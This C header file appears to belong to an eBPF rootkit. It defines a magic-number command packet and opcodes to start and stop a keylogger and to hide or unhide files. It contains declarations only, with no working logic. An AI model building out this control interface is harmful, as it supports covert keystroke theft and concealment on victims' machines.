#ifndef __CONFIG_H
#define __CONFIG_H

#define MAX_NAME_LEN 32
#define ROOTKIT_FILE_NAME "rootkit"

#ifdef __BPF__
/* vmlinux.h already provides these */
#else
#include <stdint.h>

typedef uint8_t  u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;
#endif

#define COMMAND_MAGIC 0xABCDABCD

enum command_opcode {
    COMMAND_KEYLOGGER_START = 0,
    COMMAND_KEYLOGGER_STOP,

    COMMAND_HIDE_FILE,
    COMMAND_UNHIDE_FILE,
};

struct command_packet {
    u32 magic;
    u32 opcode;
    u32 arg;
    char data[MAX_NAME_LEN];
};

#endif /* __CONFIG_H */
